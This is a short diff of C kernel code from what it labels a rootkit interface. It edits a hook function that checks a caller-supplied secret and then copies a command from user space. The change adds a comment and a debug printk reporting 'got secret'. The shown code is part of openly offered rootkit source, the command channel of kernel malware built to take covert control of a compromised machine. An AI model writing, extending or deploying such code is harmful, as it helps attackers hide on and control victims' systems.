@@ -60,6 +60,8 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
   if (!iface__hook.hooked)
     return -EINVAL;
 
+  /* need correct secret */
+
   if (secret == iface__secret) {
     /*
     get the command
@@ -67,7 +69,7 @@ unsigned long iface_hook_func(unsigned long secret, char __user *command,
     we don't care if this fails, because `strcmp`
     will take care of invalid buffers
     */
-
+printk("[rootkit interface] got secret");
     memset(command_buf, '\0', sizeof(command_buf));
     strncpy_from_user(command_buf, command, sizeof(command_buf));
 
